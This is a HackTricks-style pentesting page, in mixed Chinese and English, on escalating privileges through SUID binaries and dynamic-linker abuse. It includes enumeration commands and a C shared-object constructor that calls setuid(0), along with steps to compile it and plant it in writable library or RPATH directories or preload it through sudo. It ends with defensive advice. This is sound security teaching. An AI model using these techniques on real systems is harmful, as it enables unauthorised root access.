# SUID Shared Library and Linker Abuse

{{#include ../../banners/hacktricks-training.md}}

SUID binaries 通常会检查直接命令执行，但自定义 SUID 程序也可能通过 dynamic linker 存在漏洞。其常见模式很简单：特权 executable 从低权限用户可以影响的路径或配置中加载代码。

本页面重点介绍通用 technique patterns：缺失的 libraries、可写的 library directories、`RPATH`/`RUNPATH`、通过 sudo 使用 `LD_PRELOAD`、linker configuration，以及 SUID hardlink confusion。

## 快速枚举

首先查找异常的 SUID files，并检查它们是否为 dynamically linked：
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
重点关注非标准位置、自定义应用路径、由 root 所有但位于软件包管理目录之外的二进制文件，以及从可写目录加载的依赖项。

实用的可写性检查：
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

Some custom SUID binaries try to load a shared object that does not exist. If the missing path is under a directory controlled by the attacker, the binary may load attacker-supplied code as the effective user.

查找失败的 library 查找：
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
如果该 binary 会在可写路径中搜索 `libexample.so`，则最小化的影响证明 library 可以使用 constructor。在验证期间，请确保影响证明无害：
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
使用二进制文件尝试加载的确切文件名构建它：
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
可利用的条件不只是缺少 library。攻击者还必须能够将兼容的 shared object 放置到特权 loader 会接受的路径中。

## 可写 Library Directory

有时所有依赖项都存在，但用于解析这些依赖项的某个目录是可写的。这可能允许替换已加载的 library，或植入一个具有相同名称、优先级更高的 library。

检查 dependency paths：
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
如果该目录可写，请在 lab 环境中使用可安全复制的方法进行验证。在 live host 上替换 system libraries 可能导致 authentication、package management 或 boot-critical services 中断。

## RPATH 和 RUNPATH

`RPATH` 和 `RUNPATH` 是 dynamic-section 条目，用于告知 loader 在何处搜索 libraries。当它们指向 attacker 可写的目录时，在 SUID programs 中会带来危险。

检测它们：
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
示例危险输出：
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
如果 `/opt/app/lib` 可写，且该 binary 需要 `libcustom.so`，攻击者可能可以在那里放置恶意的 `libcustom.so`：
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` 和 `RUNPATH` 在所有解析细节上并不完全相同，但对于 privilege-escalation review，实际问题是相同的：SUID binary 是否会在 attacker-writable directory 中搜索某个 library name？

## LD_PRELOAD、LD_LIBRARY_PATH 和 SUID

对于普通程序，`LD_PRELOAD` 和 `LD_LIBRARY_PATH` 可以强制或影响 shared object 的加载。对于 SUID 程序，dynamic loader 通常会进入 secure-execution mode，并忽略危险的 environment variables。

这意味着，plain SUID binary 通常不会仅仅因为用户可以设置 `LD_PRELOAD` 就存在 vulnerability：
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
常见的例外是 sudo 配置错误。如果 `sudo -l` 显示保留了 `LD_PRELOAD` 或 `LD_LIBRARY_PATH` 等变量，则 sudo 允许执行的命令可能会加载攻击者控制的代码：
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
不要混淆以下情况：

- 对普通 SUID binary 使用 `LD_PRELOAD`：通常会被 secure execution 阻止。
- 被 sudo 保留的 `LD_PRELOAD`：可能存在 exploit。
- 可写路径中缺失的 `.so`：当 SUID binary 自然加载该路径时，可被 exploit。
- 指向可写目录的 `RPATH`/`RUNPATH`：当所需 library 可被控制时，可被 exploit。
- `/etc/ld.so.preload` 或 linker 配置的写入权限：影响整个系统，危害较高。

## Linker 配置

dynamic linker 还会读取系统配置，例如 `/etc/ld.so.conf`、`/etc/ld.so.conf.d/`、linker cache，以及某些情况下的 `/etc/ld.so.preload`。

高价值检查：
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
可写的 linker 配置通常比单个存在漏洞的 SUID binary 更严重，因为它会影响许多 dynamically linked 进程。`/etc/ld.so.preload` 尤其危险，因为它可以强制将 shared object 注入特权进程。

## SUID Hardlink Confusion

Hardlink 可以让同一个 SUID inode 以多个名称出现。这对于隐藏特权 helper、干扰清理流程或绕过简单的基于路径的审查很有用。

查找具有多个 link 的 SUID 文件：
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
检查指向同一 inode 的所有路径：
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
这种滥用并不是硬链接会改变权限，而是路径混淆：特权 inode 可能通过一个防御人员或脚本预料之外的名称被访问。有关更深入的 inode 和硬链接工作流程，请参阅 [文件系统、Inode 与恢复](../main-system-information/filesystem-inodes-and-recovery.md)。

## 防御要点

- 尽可能使 SUID binaries 保持精简、经过审计并由 package 管理。
- 避免将 `RPATH`/`RUNPATH` 指向可写目录或由应用管理的目录。
- 确保 library 目录归 root 所有，且普通用户不可写入。
- 不要通过 sudo 保留 `LD_PRELOAD`、`LD_LIBRARY_PATH` 或类似的 loader variables。
- 监控 `/etc/ld.so.preload`、`/etc/ld.so.conf`、`/etc/ld.so.conf.d/` 以及异常的 SUID files。
- 检查 hardlinked SUID files，并调查标准系统路径之外的自定义 SUID wrappers。

{{#include ../../banners/hacktricks-training.md}}
